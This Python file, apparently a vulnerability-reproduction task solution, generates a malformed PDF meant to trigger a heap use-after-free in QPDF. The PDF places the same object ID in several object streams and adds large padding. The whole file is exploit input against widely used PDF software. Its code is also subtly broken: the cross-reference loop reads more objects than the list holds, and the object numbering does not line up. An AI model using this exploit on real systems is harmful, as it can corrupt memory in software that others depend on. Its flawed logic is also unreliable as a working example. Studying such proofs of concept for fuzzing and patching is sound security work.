import os
import subprocess
import tempfile
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC exploits the heap use-after-free in QPDFWriter::preserveObjectStreams
        # The vulnerability occurs when there are multiple entries for the same object id
        # in the object cache, and QPDF::getCompressibleObjSet deletes objects incorrectly
        
        # We'll create a PDF with:
        # 1. Multiple object streams containing the same object IDs
        # 2. Objects referenced from multiple locations
        # 3. Specifically crafted to trigger the delete-before-use pattern
        
        pdf_objects = []
        
        # Helper to format PDF objects
        def obj(num, gen, content):
            return f"{num} {gen} obj\n{content}\nendobj\n"
        
        # Helper for streams
        def stream_obj(num, gen, dict_content, stream_data):
            return f"{num} {gen} obj\n{dict_content}\nstream\n{stream_data}\nendstream\nendobj\n"
        
        # Header
        pdf = "%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        
        # Create object 1: Catalog
        catalog = "<< /Type /Catalog /Pages 2 0 R >>"
        pdf_objects.append(obj(1, 0, catalog))
        
        # Create object 2: Pages
        pages = "<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        pdf_objects.append(obj(2, 0, pages))
        
        # Create object 3: Page
        page = """<< 
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources << /ProcSet [/PDF] >>
>>"""
        pdf_objects.append(obj(3, 0, page))
        
        # Create object 4: Content stream
        content = "BT /F1 12 Tf 72 720 Td (Triggering Heap Use-After-Free) Tj ET"
        content_dict = "<< /Length %d >>" % len(content)
        pdf_objects.append(stream_obj(4, 0, content_dict, content))
        
        # Now create the malicious object streams
        # We'll create multiple object streams that contain the same object IDs
        # This is what triggers the bug
        
        # Object stream 5: Contains objects 6, 7, 8
        obj5_stream_data = ""
        obj5_index = ""
        offset = 0
        
        # Object 6 (in stream)
        obj6_content = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
        obj5_index += f"6 {offset} "
        obj5_stream_data += obj6_content + " "
        offset += len(obj6_content) + 1
        
        # Object 7 (in stream)
        obj7_content = "<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] >>"
        obj5_index += f"7 {offset} "
        obj5_stream_data += obj7_content + " "
        offset += len(obj7_content) + 1
        
        # Object 8 (in stream) - This object will be referenced multiple times
        obj8_content = "<< /Type /Pattern /PatternType 1 /PaintType 1 >>"
        obj5_index += f"8 {offset} "
        obj5_stream_data += obj8_content
        offset += len(obj8_content)
        
        obj5_dict = f"<< /Type /ObjStm /N 3 /First {len(obj5_index)} /Length {len(obj5_stream_data)} >>"
        obj5_full_stream = obj5_index + obj5_stream_data
        pdf_objects.append(stream_obj(5, 0, obj5_dict, obj5_full_stream))
        
        # Object stream 9: Contains objects 10, 11, and ALSO object 8 again!
        # This creates multiple cache entries for object 8
        obj9_stream_data = ""
        obj9_index = ""
        offset = 0
        
        # Object 10 (in stream)
        obj10_content = "<< /Type /Font /Subtype /Type1 /BaseFont /Times-Roman >>"
        obj9_index += f"10 {offset} "
        obj9_stream_data += obj10_content + " "
        offset += len(obj10_content) + 1
        
        # Object 11 (in stream)
        obj11_content = "<< /Type /XObject /Subtype /Form /BBox [0 0 200 200] >>"
        obj9_index += f"11 {offset} "
        obj9_stream_data += obj11_content + " "
        offset += len(obj11_content) + 1
        
        # Object 8 AGAIN (same ID, different content) - This creates the duplicate cache entry
        obj8_alt_content = "<< /Type /Pattern /PatternType 1 /PaintType 2 /TilingType 2 >>"
        obj9_index += f"8 {offset} "
        obj9_stream_data += obj8_alt_content
        offset += len(obj8_alt_content)
        
        obj9_dict = f"<< /Type /ObjStm /N 3 /First {len(obj9_index)} /Length {len(obj9_stream_data)} >>"
        obj9_full_stream = obj9_index + obj9_stream_data
        pdf_objects.append(stream_obj(9, 0, obj9_dict, obj9_full_stream))
        
        # Create indirect references to object 8 from multiple places
        # This ensures the object cache has active references
        
        # Object 12: Array referencing object 8 multiple times
        obj12_content = "<< /Type /Array /Values [8 0 R 8 0 R 8 0 R 8 0 R 8 0 R] >>"
        pdf_objects.append(obj(12, 0, obj12_content))
        
        # Object 13: Dictionary with multiple references to object 8
        obj13_content = "<< /Type /Dict /Ref1 8 0 R /Ref2 8 0 R /Ref3 8 0 R >>"
        pdf_objects.append(obj(13, 0, obj13_content))
        
        # Object 14: Another object stream to increase complexity
        obj14_stream_data = ""
        obj14_index = ""
        offset = 0
        
        for i in range(15, 25):
            content = f"<< /ID {i} /Data (Dummy object {i}) >>"
            obj14_index += f"{i} {offset} "
            obj14_stream_data += content + " "
            offset += len(content) + 1
        
        obj14_dict = f"<< /Type /ObjStm /N 10 /First {len(obj14_index)} /Length {len(obj14_stream_data)} >>"
        obj14_full_stream = obj14_index + obj14_stream_data
        pdf_objects.append(stream_obj(14, 0, obj14_dict, obj14_full_stream))
        
        # Add padding to reach target size
        padding_obj_content = "<< /Padding " + "A" * 30000 + " >>"
        padding_dict = f"<< /Length {len(padding_obj_content)} >>"
        pdf_objects.append(stream_obj(25, 0, padding_dict, padding_obj_content))
        
        # Assemble all objects
        for obj_data in pdf_objects:
            pdf += obj_data
        
        # Cross-reference table
        xref_offset = len(pdf)
        xref = f"xref\n0 26\n0000000000 65535 f \n"
        
        # Calculate object offsets
        offsets = [0] * 26
        current_pos = len("%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
        
        for i in range(1, 26):
            offsets[i] = current_pos
            # Find the length of this object
            obj_lines = pdf_objects[i-1].split('\n')
            for line in obj_lines:
                current_pos += len(line) + 1  # +1 for newline
        
        # Write xref entries
        for i in range(26):
            xref += f"{offsets[i]:010d} 00000 n \n" if i > 0 else f"{offsets[i]:010d} 65535 f \n"
        
        pdf += xref
        
        # Trailer
        trailer = f"""trailer
<< /Size 26 /Root 1 0 R >>
startxref
{xref_offset}
%%EOF"""
        
        pdf += trailer
        
        return pdf.encode('latin-1')